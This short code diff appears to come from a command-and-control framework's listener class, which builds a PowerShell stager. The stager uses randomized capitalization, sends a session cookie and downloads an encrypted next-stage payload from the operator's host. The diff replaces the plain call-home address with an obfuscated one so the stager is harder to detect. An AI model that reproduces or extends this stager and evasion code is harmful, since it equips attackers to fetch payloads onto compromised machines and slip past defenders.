@@ -251,7 +251,8 @@ class Listener:
                 stager += helpers.randomize_capitalization("$wc.Headers.Add(")
                 stager += "\"Cookie\",\"session=%s\");" % (b64RoutingPacket)
 
-                stager += "$ser='%s';$t='%s';" % (host, stage0)
+                stager += "$ser="+helpers.obfuscate_call_home_address(host)+";$t='"+stage0+"';"
+                
                 stager += helpers.randomize_capitalization("$data=$WC.DownloadData($ser+$t);")
                 stager += helpers.randomize_capitalization("$iv=$data[0..3];$data=$data[4..$data.length];")
 
